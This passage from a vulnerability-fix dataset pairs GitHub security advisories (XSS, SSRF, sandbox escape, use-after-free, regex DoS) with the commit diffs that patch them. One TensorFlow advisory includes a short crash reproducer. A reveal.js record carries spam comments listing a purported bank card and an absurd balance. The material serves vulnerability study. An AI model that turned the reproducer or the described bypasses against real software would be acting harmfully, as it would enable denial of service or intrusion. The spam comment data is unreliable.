17:23:54","message":"fix: token verify","author":"Bar\u0131\u015f Soner U\u015fakl\u0131","comments":null,"stats":"{'additions': 3, 'deletions': 7, 'total': 10}","files":"{'src\/routes\/authentication.js': {'additions': 3, 'deletions': 7, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NodeBB\/NodeBB\/raw\/04dab1d550cdebf4c1567bca9a51f8b9ca48a500\/src%2Froutes%2Fauthentication.js', 'patch': \"@@ -44,13 +44,9 @@ Auth.getLoginStrategies = function () {\\n };\\n \\n Auth.verifyToken = async function (token, done) {\\n-\\tlet { tokens = [] } = await meta.settings.get('core.api');\\n-\\ttokens = tokens.reduce((memo, cur) => {\\n-\\t\\tmemo[cur.token] = cur.uid;\\n-\\t\\treturn memo;\\n-\\t}, {});\\n-\\n-\\tconst uid = tokens[token];\\n+\\tconst { tokens = [] } = await meta.settings.get('core.api');\\n+\\tconst tokenObj = tokens.find(t => t.token === token);\\n+\\tconst uid = tokenObj ? tokenObj.uid : undefined;\\n \\n \\tif (uid !== undefined) {\\n \\t\\tif (parseInt(uid, 10) > 0) {\"}}","message_norm":"fix: token verify","language":"no","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/routes\/authentication.js'])","num_files":1.0},{"index":2046,"vuln_id":"GHSA-hf44-3mx6-vhhw","cwe_id":"{'CWE-400'}","score":6.5,"chain":"{'https:\/\/github.com\/graphhopper\/graphhopper\/commit\/eb189be1fa7443ebf4ae881e737a18f818c95f41'}","dataset":"osv","summary":"Navigate endpoint is vulnerable to regex injection that may lead to Denial of Service. ### Impact\nThe regex injection that may lead to Denial of Service.\n\n### Patches\nWill be patched in 2.4 and 3.0\n\n### Workarounds\nVersions lower than 2.x are only affected if the navigation module is added\n\n### References\nSee this pull request for the fix: https:\/\/github.com\/graphhopper\/graphhopper\/pull\/2304\n\nIf you have any questions or comments about this advisory please [send us an Email](https:\/\/www.graphhopper.com\/contact-form\/) or create a topic [here](https:\/\/discuss.graphhopper.com\/).","published_date":"2021-05-19","chain_len":1,"project":"https:\/\/github.com\/graphhopper\/graphhopper","commit_href":"https:\/\/github.com\/graphhopper\/graphhopper\/commit\/eb189be1fa7443ebf4ae881e737a18f818c95f41","commit_sha":"eb189be1fa7443ebf4ae881e737a18f818c95f41","patch":"SINGLE","chain_ord":"['eb189be1fa7443ebf4ae881e737a18f818c95f41']","before_first_fix_commit":"{'744f0e2535355e67aefbb6906303332b8aff0a7f'}","last_fix_commit":"eb189be1fa7443ebf4ae881e737a18f818c95f41","chain_ord_pos":1.0,"commit_datetime":"05\/04\/2021, 18:03:31","message":"avoid regex in navigate module (#2304)\n\n* replace two regexs with one indexOf\r\n\r\n* make check stricter\r\n\r\n* use @easbar's suggestion","author":"Peter","comments":null,"stats":"{'additions': 3, 'deletions': 5, 'total': 8}","files":"{'navigation\/src\/main\/java\/com\/graphhopper\/navigation\/NavigateResource.java': {'additions': 3, 'deletions': 5, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/graphhopper\/graphhopper\/raw\/eb189be1fa7443ebf4ae881e737a18f818c95f41\/navigation%2Fsrc%2Fmain%2Fjava%2Fcom%2Fgraphhopper%2Fnavigation%2FNavigateResource.java', 'patch': '@@ -188,13 +188,11 @@ private GHResponse calcRoute(List<Double> favoredHeadings, List<GHPoint> request\\n      * The url looks like: \"...\/{profile}\/1.522438,42.504606;1.527209,42.504776;1.526113,42.505144;1.527218,42.50529?..\"\\n      *\/\\n     private List<GHPoint> getPointsFromRequest(HttpServletRequest httpServletRequest, String profile) {\\n-\\n         String url = httpServletRequest.getRequestURI();\\n-        url = url.replaceFirst(\"\/navigate\/directions\/v5\/gh\/\" + profile + \"\/\", \"\");\\n-        url = url.replaceAll(\"\\\\\\\\?[*]\", \"\");\\n-\\n+        String urlStart = \"\/navigate\/directions\/v5\/gh\/\" + profile + \"\/\";\\n+        if (!url.startsWith(urlStart)) throw new IllegalArgumentException(\"Incorrect URL \" + url);\\n+        url = url.substring(urlStart.length());\\n         String[] pointStrings = url.split(\";\");\\n-\\n         List<GHPoint> points = new ArrayList<>(pointStrings.length);\\n         for (int i = 0; i < pointStrings.length; i++) {\\n             points.add(GHPoint.fromStringLonLat(pointStrings[i]));'}}","message_norm":"avoid regex in navigate module (#2304)\n\n* replace two regexs with one indexof\r\n\r\n* make check stricter\r\n\r\n* use @easbar's suggestion","language":"en","entities":"[('#2304', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['navigation\/src\/main\/java\/com\/graphhopper\/navigation\/NavigateResource.java'])","num_files":1.0},{"index":2047,"vuln_id":"GHSA-hf4q-52x6-4p57","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/d9bae9df873c2d2a13a2eb08d512019d49ebca68'}","dataset":"osv","summary":"Unrestricted file upload leads to stored cross-site scripting in Microweber Microweber prior to version 1.2.12 allows unrestricted file upload, which could lead to stored cross-site scripting.","published_date":"2022-03-11","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/d9bae9df873c2d2a13a2eb08d512019d49ebca68","commit_sha":"d9bae9df873c2d2a13a2eb08d512019d49ebca68","patch":"SINGLE","chain_ord":"['d9bae9df873c2d2a13a2eb08d512019d49ebca68']","before_first_fix_commit":"{'8902c415144823c48b056f881aa00ceb1f5d350f'}","last_fix_commit":"d9bae9df873c2d2a13a2eb08d512019d49ebca68","chain_ord_pos":1.0,"commit_datetime":"03\/09\/2022, 14:55:02","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'src\/MicroweberPackages\/Utils\/System\/Files.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/d9bae9df873c2d2a13a2eb08d512019d49ebca68\/src%2FMicroweberPackages%2FUtils%2FSystem%2FFiles.php', 'patch': \"@@ -591,6 +591,7 @@ function get_dangerous_files_extentions()\\n             'py',\\n             'alfa',\\n             'asp',\\n+            'aspx',\\n             'htaccess',\\n             'exe',\\n             'msi',\"}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Utils\/System\/Files.php'])","num_files":1.0},{"index":2050,"vuln_id":"GHSA-hf79-8hjp-rrvq","cwe_id":"{'CWE-416'}","score":8.5,"chain":"{'https:\/\/github.com\/bytecodealliance\/lucet\/commit\/7c7757c772fb709c61b1442bcc1e1fbee97bf4a8'}","dataset":"osv","summary":"Use After Free in lucet ### Impact\nThere is a bug in the main branch of Lucet's `lucet-runtime` that allows a use-after-free in an `Instance` object that could result in memory corruption, data race, or other related issues.  This bug was introduced early in the development of Lucet and is present in all releases.  As a result of this bug, and dependent on the memory backing for the `Instance` objects, it is possible to trigger a use-after-free when the `Instance` is dropped.\n\n### Patches\nUsers should upgrade to the `main` branch of the Lucet repository. Lucet does not provide versioned releases on crates.io.\n\n### Workarounds\nThere is no way to remediate this vulnerability without upgrading.\n\n### Description\nLucet uses a \"pool\" allocator for new WebAssembly instances that are created. This pool allocator manages everything from the linear memory of the wasm instance, the runtime stack for async switching, as well as the memory behind the Instance itself. `Instances` are referred to via an `InstanceHandle` type which will, on drop, release the memory backing the Instance back to the pool.\n\nWhen an Instance is dropped, the fields of the `Instance` are destructed top-to-bottom, however when the `alloc: Alloc` field is destructed, the memory backing the `Instance` is released back to the pool before the destructors of the remaining fields are run. If another thread allocates the same memory from the pool while these destructors are still running, a race condition occurs that can lead to use-after-free errors.\n\nThe bug was corrected by changing how the `InstanceHandle` destructor operates to ensure that the memory backing an Instance is only returned to the pool once the `Instance` has been completely destroyed.\n\nThis security advisory has been assigned CVE-2021-43790.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [lucet repository](https:\/\/github.com\/bytecodealliance\/lucet)\n* Email [the lucet team](mailto:lucet@fastly.com)\n* See the [Bytecode Alliance security policy](https:\/\/bytecodealliance.org\/security)","published_date":"2021-11-30","chain_len":1,"project":"https:\/\/github.com\/bytecodealliance\/lucet","commit_href":"https:\/\/github.com\/bytecodealliance\/lucet\/commit\/7c7757c772fb709c61b1442bcc1e1fbee97bf4a8","commit_sha":"7c7757c772fb709c61b1442bcc1e1fbee97bf4a8","patch":"SINGLE","chain_ord":"['7c7757c772fb709c61b1442bcc1e1fbee97bf4a8']","before_first_fix_commit":"{'8fb1fece339927e178f6cfef4eb67328b500237d'}","last_fix_commit":"7c7757c772fb709c61b1442bcc1e1fbee97bf4a8","chain_ord_pos":1.0,"commit_datetime":"11\/29\/2021, 23:00:02","message":"Merge pull request from GHSA-hf79-8hjp-rrvq\n\n* Use manual drop\n\n* Add some comments to `ManuallyDrop` usage\n\n* rustfmt\n\nCo-authored-by: Aaron Turon <aturon@fastly.com>\nCo-authored-by: Alex Crichton <alex@alexcrichton.com>","author":"Pat Hickey","comments":null,"stats":"{'additions': 26, 'deletions': 13, 'total': 39}","files":"{'lucet-runtime\/lucet-runtime-internals\/src\/instance.rs': {'additions': 26, 'deletions': 13, 'changes': 39, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bytecodealliance\/lucet\/raw\/7c7757c772fb709c61b1442bcc1e1fbee97bf4a8\/lucet-runtime%2Flucet-runtime-internals%2Fsrc%2Finstance.rs', 'patch': '@@ -14,7 +14,6 @@ use crate::error::Error;\\n #[cfg(feature = \"concurrent_testpoints\")]\\n use crate::lock_testpoints::LockTestpoints;\\n use crate::module::{self, FunctionHandle, Global, GlobalValue, Module, TrapCode};\\n-use crate::region::RegionInternal;\\n use crate::sysdeps::HOST_PAGE_SIZE_EXPECTED;\\n use crate::val::{UntypedRetVal, Val};\\n use crate::vmctx::Vmctx;\\n@@ -27,6 +26,7 @@ use std::cell::{BorrowError, BorrowMutError, Ref, RefCell, RefMut, UnsafeCell};\\n use std::convert::TryFrom;\\n use std::marker::PhantomData;\\n use std::mem;\\n+use std::mem::ManuallyDrop;\\n use std::ops::{Deref, DerefMut};\\n use std::ptr::{self, NonNull};\\n use std::sync::Arc;\\n@@ -147,20 +147,29 @@ impl Drop for InstanceHandle {\\n             unsafe {\\n                 let inst = self.inst.as_mut();\\n \\n-                \/\/ Grab a handle to the region to ensure it outlives `inst`.\\n+                \/\/ The `inst.alloc` field manages the memory of the instance\\n+                \/\/ itself. Note, though, that this field is in a `ManuallyDrop`\\n+                \/\/ so it won\\'t get dropped automatically in `drop_in_place`.\\n+                \/\/ This is the point where we take over that precise drop.\\n                 \/\/\\n-                \/\/ This ensures that the region won\\'t be dropped by `inst` being\\n-                \/\/ dropped, which could result in `inst` being unmapped by the\\n-                \/\/ Region *during* drop of the Instance\\'s fields.\\n-                let region: Arc<dyn RegionInternal> = inst.alloc().region.clone();\\n+                \/\/ By using `take` here we\\'re basically calling `ptr::read`\\n+                \/\/ which \"duplicates\" the `alloc` since the `alloc` local\\n+                \/\/ variable here is the exact same as `inst.alloc`. All we do\\n+                \/\/ with `inst`, though, is call `drop_in_place`, which\\n+                \/\/ invalidates every other field in `inst`.\\n+                let alloc: Alloc = ManuallyDrop::take(&mut inst.alloc);\\n \\n                 \/\/ drop the actual instance\\n                 std::ptr::drop_in_place(inst);\\n \\n-                \/\/ and now we can drop what may be the last Arc<Region>. If it is\\n-                \/\/ it can safely do what it needs with memory; we\\'re not running\\n-                \/\/ destructors on it anymore.\\n-                mem::drop(region);\\n+                \/\/ Now that we\\'re 100% done with the instance, destructors and\\n+                \/\/ all, we can release the memory of the instance back to the\\n+                \/\/ original allocator from whence it came (be it mmap or uffd\\n+                \/\/ based). This will run the \"official\" destructor for `Alloc`\\n+                \/\/ which internally does the release. Note that after this\\n+                \/\/ operation the `inst` pointer is invalid and can no longer be\\n+                \/\/ used.\\n+                drop(alloc);\\n             }\\n         }\\n     }\\n@@ -233,8 +242,12 @@ pub struct Instance {\\n     \/\/\/ Conditionally-present helpers to force permutations of possible races in testing.\\n     pub lock_testpoints: Arc<LockTestpoints>,\\n \\n-    \/\/\/ The memory allocated for this instance\\n-    alloc: Alloc,\\n+    \/\/\/ The memory allocated for this instance.\\n+    \/\/\/\\n+    \/\/\/ Note that this is in a `ManuallyDrop` because this manages the memory of\\n+    \/\/\/ this `Instance` itself. To have precise control over this memory we\\n+    \/\/\/ handle this in `Drop for InstanceHandle`.\\n+    alloc: ManuallyDrop<Alloc>,\\n \\n     \/\/\/ Handler run for signals that do not arise from a known WebAssembly trap, or that involve\\n     \/\/\/ memory outside of the current instance.\\n@@ -1055,7 +1068,7 @@ impl Instance {\\n             kill_state,\\n             #[cfg(feature = \"concurrent_testpoints\")]\\n             lock_testpoints,\\n-            alloc,\\n+            alloc: ManuallyDrop::new(alloc),\\n             fatal_handler: default_fatal_handler,\\n             c_fatal_handler: None,\\n             signal_handler: Box::new(signal_handler_none) as Box<SignalHandler>,'}}","message_norm":"merge pull request from ghsa-hf79-8hjp-rrvq\n\n* use manual drop\n\n* add some comments to `manuallydrop` usage\n\n* rustfmt\n\nco-authored-by: aaron turon <aturon@fastly.com>\nco-authored-by: alex crichton <alex@alexcrichton.com>","language":"en","entities":"[('ghsa-hf79-8hjp-rrvq', 'VULNID', 'GHSA'), ('add', 'ACTION', ''), ('aturon@fastly.com', 'EMAIL', ''), ('alex@alexcrichton.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lucet-runtime\/lucet-runtime-internals\/src\/instance.rs'])","num_files":1.0},{"index":2059,"vuln_id":"GHSA-hgch-jjmr-gp7w","cwe_id":"{'CWE-94'}","score":9.9,"chain":"{'https:\/\/github.com\/commenthol\/safer-eval\/commit\/1c29f6a6e304fb650c05056e217e457a0d2cc3c5'}","dataset":"osv","summary":"Sandbox Breakout \/ Arbitrary Code Execution in safer-eval Versions of `safer-eval` before 1.3.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. A payload using constructor properties can escape the sandbox and execute arbitrary code.\n\n\n## Recommendation\n\nUpgrade to version 1.3.2.","published_date":"2019-10-17","chain_len":1,"project":"https:\/\/github.com\/commenthol\/safer-eval","commit_href":"https:\/\/github.com\/commenthol\/safer-eval\/commit\/1c29f6a6e304fb650c05056e217e457a0d2cc3c5","commit_sha":"1c29f6a6e304fb650c05056e217e457a0d2cc3c5","patch":"SINGLE","chain_ord":"['1c29f6a6e304fb650c05056e217e457a0d2cc3c5']","before_first_fix_commit":"{'74e5bb845c3cf1cab4f0a5a8dea08685c20970c7'}","last_fix_commit":"1c29f6a6e304fb650c05056e217e457a0d2cc3c5","chain_ord_pos":1.0,"commit_datetime":"03\/09\/2019, 20:54:53","message":"fix: disallow usage of Object.constructor","author":"commenthol","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'src\/index.js': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/commenthol\/safer-eval\/raw\/1c29f6a6e304fb650c05056e217e457a0d2cc3c5\/src%2Findex.js', 'patch': '@@ -40,8 +40,11 @@ class SaferEval {\\n     if (typeof code !== \\'string\\') {\\n       throw new TypeError(\\'not a string\\')\\n     }\\n+    let src = \\'Object.constructor = function () {};\\\\n\\'\\n+    src += \\'return \\' + code + \\';\\\\n\\'\\n+\\n     return vm.runInContext(\\n-      \\'(function () {\"use strict\"; return \\' + code + \\'})()\\',\\n+      \\'(function () {\"use strict\"; \\' + src + \\'})()\\',\\n       this._context,\\n       this._options\\n     )'}}","message_norm":"fix: disallow usage of object.constructor","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.js'])","num_files":1.0},{"index":2072,"vuln_id":"GHSA-hhqj-cfjx-vj25","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/hakimel\/reveal.js\/commit\/32cdd3b1872ba8e2267c9e87ae216cb55f40f4d2'}","dataset":"osv","summary":"Cross site scripting in reveal.js The onmessage event listener in \/plugin\/notes\/speaker-view.html does not check the origin of postMessage before adding the content to the webpage. The vulnerable code allows any origin to postMessage on the browser window and feeds attacker's input to parts using which attacker can execute arbitrary javascript code on victim's browser window hosting reveal.js","published_date":"2022-03-02","chain_len":1,"project":"https:\/\/github.com\/hakimel\/reveal.js","commit_href":"https:\/\/github.com\/hakimel\/reveal.js\/commit\/32cdd3b1872ba8e2267c9e87ae216cb55f40f4d2","commit_sha":"32cdd3b1872ba8e2267c9e87ae216cb55f40f4d2","patch":"SINGLE","chain_ord":"['32cdd3b1872ba8e2267c9e87ae216cb55f40f4d2']","before_first_fix_commit":"{'e33c3c72f93d4c70ded3a90f5918f60082c96451'}","last_fix_commit":"32cdd3b1872ba8e2267c9e87ae216cb55f40f4d2","chain_ord_pos":1.0,"commit_datetime":"02\/26\/2022, 11:46:18","message":"Fix DOM XSS","author":"r0hanSH","comments":"{'com_1': {'author': 'Zhila136', 'datetime': '06\/16\/2022, 03:13:17', 'body': '\u062e\u062f\u0645\u0627\u062a: \u0647\u0645\u0631\u0627\u0647 \u06a9\u0627\u0631\u062a \\r\\n\u0646\u0648\u0639 \u0633\u0631\u0648\u06cc\u0633: \u0647\u0645\u0631\u0627\u0647 \u06a9\u0627\u0631\u062a \u0633\u067e\u0647\\r\\n\u0634\u0645\u0627\u0631\u0647 \u06a9\u0627\u0631\u062a: 9243 3628 1010 5892\\r\\n\u0628\u0646\u0627\u0645: \u0627\u0628\u0631\u0627\u0647\u06cc\u0645 \u0645\u0631\u0627\u062f\u06cc \u0627\u0633\u062a\u06cc\u0627\u0631\\r\\n\u0645\u0648\u062c\u0648\u062f\u06cc \u06a9\u0627\u0631\u062a:\\r\\n147,000,000,000,000\u0631\u06cc\u0627\u0644\\r\\n\u0645\u0628\u0644\u063a \u0642\u0627\u0628\u0644 \u0628\u0631\u062f\u0627\u0634\u062a:\\r\\n147,000,000,000,000\u0631\u06cc\u0627\u0644\\r\\n\u06a9\u062f \u067e\u06cc\u06af\u06cc\u0631\u06cc:963877\\r\\n\u0634\u0645\u0627\u0631\u0647 \u0645\u0631\u062c\u0639:94382963877\\r\\n\u06a9\u062f\u0633\u062f\u0627\u062f:20060530\\r\\nCODETRANSFER:G0956DVY87\\r\\nCOMMON ACCOUNT:947022366\\r\\nISIN:XS2111948803\\r\\nCFI CODE:DBFUFB\\r\\n\\r\\n\u0648\u0636\u0639\u06cc\u062a \u06a9\u0627\u0631\u062a: \u0627\u06a9\u062a\u06cc\u0648 \u0648 \u0642\u0627\u0628\u0644 \u062f\u0633\u062a\u0631\u0633\u06cc\\r\\n            \u0633\u0631\u0648\u0631 \u0628\u0627\u0646\u06a9 \u0633\u067e\u0647'}, 'com_2': {'author': 'Zhila136', 'datetime': '06\/16\/2022, 03:13:31', 'body': '> \u062e\u062f\u0645\u0627\u062a: \u0647\u0645\u0631\u0627\u0647 \u06a9\u0627\u0631\u062a \u0646\u0648\u0639 \u0633\u0631\u0648\u06cc\u0633: \u0647\u0645\u0631\u0627\u0647 \u06a9\u0627\u0631\u062a \u0633\u067e\u0647 \u0634\u0645\u0627\u0631\u0647 \u06a9\u0627\u0631\u062a: 9243 3628 1010 5892 \u0628\u0646\u0627\u0645: \u0627\u0628\u0631\u0627\u0647\u06cc\u0645 \u0645\u0631\u0627\u062f\u06cc \u0627\u0633\u062a\u06cc\u0627\u0631 \u0645\u0648\u062c\u0648\u062f\u06cc \u06a9\u0627\u0631\u062a: 147,000,000,000,000\u0631\u06cc\u0627\u0644 \u0645\u0628\u0644\u063a \u0642\u0627\u0628\u0644 \u0628\u0631\u062f\u0627\u0634\u062a: 147,000,000,000,000\u0631\u06cc\u0627\u0644 \u06a9\u062f \u067e\u06cc\u06af\u06cc\u0631\u06cc:963877 \u0634\u0645\u0627\u0631\u0647 \u0645\u0631\u062c\u0639:94382963877 \u06a9\u062f\u0633\u062f\u0627\u062f:20060530 CODETRANSFER:G0956DVY87 COMMON ACCOUNT: 947022366 ISIN:XS2111948803 \u06a9\u062f CFI:DBFUFB\\r\\n> \\r\\n> \u06a9\u0627\u0631\u062a \u0648\u0636\u0639\u06cc\u062a: \u0627\u06a9\u062a\u06cc\u0648 \u0648 \u0642\u0627\u0628\u0644 \u062f\u0633\u062a\u0631\u0633\u06cc \u0633\u0631\u0648\u0631 \u0628\u0627\u0646\u06a9 \u0633\u067e\u0647'}, 'com_3': {'author': 'Zhila136', 'datetime': '06\/16\/2022, 03:13:50', 'body': '![\u06f2\u06f0\u06f2\u06f2\u06f0\u06f6\u06f1\u06f6_\u06f0\u06f7\u06f3\u06f7\u06f4\u06f0](https:\/\/user-images.githubusercontent.com\/97744031\/173983277-3cf21aef-9310-4a21-b681-3457044107ad.jpg)'}}","stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'plugin\/notes\/speaker-view.html': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hakimel\/reveal.js\/raw\/32cdd3b1872ba8e2267c9e87ae216cb55f40f4d2\/plugin%2Fnotes%2Fspeaker-view.html', 'patch': '@@ -368,6 +368,10 @@ <h4 class=\"label\">Notes<\/h4>\\n \\n \\t\\t\\t\\twindow.addEventListener( \\'message\\', function( event ) {\\n \\n+\\t\\t\\t\\t\\tif (window.location.origin !== event.origin){\\n+\\t\\t\\t\\t\\t\\treturn;\\n+\\t\\t\\t\\t\\t}\\n+\\n \\t\\t\\t\\t\\tclearTimeout( connectionTimeout );\\n \\t\\t\\t\\t\\tconnectionStatus.style.display = \\'none\\';'}}","message_norm":"fix dom xss","language":"ca","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['plugin\/notes\/speaker-view.html'])","num_files":1.0},{"index":2073,"vuln_id":"GHSA-hhr9-7xvh-8xgc","cwe_id":"{'CWE-918'}","score":7.7,"chain":"{'https:\/\/github.com\/livehelperchat\/livehelperchat\/commit\/abc9599ee7aded466ca216741dcaea533c908111'}","dataset":"osv","summary":"Server side request forgery in LiveHelperChat SSRF filter bypass port 80, 433 in LiveHelperChat prior to v3.67. An attacker could make the application perform arbitrary requests, bypass CVE-2022-1191","published_date":"2022-04-06","chain_len":1,"project":"https:\/\/github.com\/livehelperchat\/livehelperchat","commit_href":"https:\/\/github.com\/livehelperchat\/livehelperchat\/commit\/abc9599ee7aded466ca216741dcaea533c908111","commit_sha":"abc9599ee7aded466ca216741dcaea533c908111","patch":"SINGLE","chain_ord":"['abc9599ee7aded466ca216741dcaea533c908111']","before_first_fix_commit":"{'a583f4c60a98779938766e242991e637c0d938f0'}","last_fix_commit":"abc9599ee7aded466ca216741dcaea533c908111","chain_ord_pos":1.0,"commit_datetime":"04\/03\/2022, 19:37:19","message":"fix #1752","author":"Remigijus Kiminas","comments":null,"stats":"{'additions': 8, 'deletions': 2, 'total': 10}","files":"{'lhc_web\/modules\/lhcobrowse\/proxycss.php': {'additions': 8, 'deletions': 2, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/LiveHelperChat\/livehelperchat\/raw\/abc9599ee7aded466ca216741dcaea533c908111\/lhc_web%2Fmodules%2Flhcobrowse%2Fproxycss.php', 'patch': \"@@ -15,7 +15,13 @@\\n     $browse = erLhcoreClassCoBrowse::getBrowseInstance($chat);\\r\\n }\\r\\n \\r\\n-$url = parse_url($_GET['base']);\\r\\n+$base = trim($_GET['base']);\\r\\n+\\r\\n+if (!filter_var($base, FILTER_VALIDATE_URL)) {\\r\\n+    exit;\\r\\n+}\\r\\n+\\r\\n+$url = parse_url($base);\\r\\n \\r\\n \/\/ Only http\/https supported\\r\\n if (!in_array($url['scheme'],['http','https']) || (isset($url['port']) && !in_array($url['port'],[80,443]))) {\\r\\n@@ -42,7 +48,7 @@\\n         }\\r\\n     } else {\\r\\n \\r\\n-        if (!in_array($urlCSS['scheme'],['http','https']) || (isset($urlCSS['port']) && !in_array($urlCSS['port'],[80,443]))) {\\r\\n+        if (!filter_var($_GET['css'], FILTER_VALIDATE_URL) || !in_array($urlCSS['scheme'],['http','https']) || (isset($urlCSS['port']) && !in_array($urlCSS['port'],[80,443]))) {\\r\\n             exit;\\r\\n         }\"}}","message_norm":"fix #1752","language":"ca","entities":"[('fix', 'ACTION', ''), ('#1752', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lhc_web\/modules\/lhcobrowse\/proxycss.php'])","num_files":1.0},{"index":2074,"vuln_id":"GHSA-hhrj-wp42-32v3","cwe_id":"{'CWE-209'}","score":7.5,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/2417bd2eda2aa2868c1dad1abf62341f22bfc20a'}","dataset":"osv","summary":"Generation of Error Message Containing Sensitive Information in microweber Generation of Error Message Containing Sensitive Information in Packagist microweber\/microweber prior to 1.2.11.","published_date":"2022-02-19","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/2417bd2eda2aa2868c1dad1abf62341f22bfc20a","commit_sha":"2417bd2eda2aa2868c1dad1abf62341f22bfc20a","patch":"SINGLE","chain_ord":"['2417bd2eda2aa2868c1dad1abf62341f22bfc20a']","before_first_fix_commit":"{'8adc9da7307c89d7cb7b309f69d0c2922a56aa2e'}","last_fix_commit":"2417bd2eda2aa2868c1dad1abf62341f22bfc20a","chain_ord_pos":1.0,"commit_datetime":"02\/17\/2022, 09:15:14","message":"Update Comment.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'src\/MicroweberPackages\/Comment\/Models\/Comment.php': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/2417bd2eda2aa2868c1dad1abf62341f22bfc20a\/src%2FMicroweberPackages%2FComment%2FModels%2FComment.php', 'patch': \"@@ -5,10 +5,12 @@\\n use EloquentFilter\\\\Filterable;\\n use Illuminate\\\\Database\\\\Eloquent\\\\Model;\\n use MicroweberPackages\\\\Content\\\\Models\\\\ModelFilters\\\\ContentFilter;\\n+use MicroweberPackages\\\\Core\\\\Models\\\\HasSearchableTrait;\\n \\n class Comment extends Model\\n {\\n     use Filterable;\\n+    use HasSearchableTrait;\\n \\n     public $table = 'comments';\\n \\n@@ -21,6 +23,13 @@ class Comment extends Model\\n         'comment_body',\\n     ];\\n \\n+    protected $searchable = [\\n+        'comment_name',\\n+        'comment_email',\\n+        'comment_website',\\n+        'comment_body',\\n+    ];\\n+\\n     public function modelFilter()\\n     {\\n         return $this->provideFilter(ContentFilter::class);\"}}","message_norm":"update comment.php","language":"fr","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Comment\/Models\/Comment.php'])","num_files":1.0},{"index":2075,"vuln_id":"GHSA-hhvc-g5hv-48c6","cwe_id":"{'CWE-471'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7'}","dataset":"osv","summary":"Write to immutable memory region in TensorFlow ### Impact\nThe `tf.raw_ops.ImmutableConst` operation returns a constant tensor created from a memory mapped file which is assumed immutable. However, if the type of the tensor is not an integral type, the operation crashes the Python interpreter as it tries to write to the memory area:\n\n```python\n>>> import tensorflow as tf\n>>> with open('\/tmp\/test.txt','w') as f: f.write('a'*128)\n>>> tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,\n                              memory_region_name='\/tmp\/test.txt')\n```\n\nIf the file is too small, TensorFlow properly returns an error as the memory area has fewer bytes than what is needed for the tensor it creates. However, as soon as there are enough bytes, the above snippet causes a segmentation fault.\n\nThis is because the alocator used to return the buffer data is not marked as returning an opaque handle since the [needed virtual method](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7\/tensorflow\/core\/framework\/typed_allocator.h#L78-L85) is [not overriden](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/acdf3c04fcfa767ae8d109b9e1f727ef050dba4d\/tensorflow\/core\/kernels\/immutable_constant_op.cc).\n\n### Patches\nWe have patched the issue in GitHub commit [c1e1fc899ad5f8c725dcbb6470069890b5060bc7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2020-12-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7","commit_sha":"c1e1fc899ad5f8c725dcbb6470069890b5060bc7","patch":"SINGLE","chain_ord":"['c1e1fc899ad5f8c725dcbb6470069890b5060bc7']","before_first_fix_commit":"{'acdf3c04fcfa767ae8d109b9e1f727ef050dba4d'}","last_fix_commit":"c1e1fc899ad5f8c725dcbb6470069890b5060bc7","chain_ord_pos":1.0,"commit_datetime":"12\/05\/2020, 01:06:23","message":"Mark `MemmappedTensorAllocator` as returning opaque handle.\n\nThis allocator is used for `ImmutableConstantOp` and it 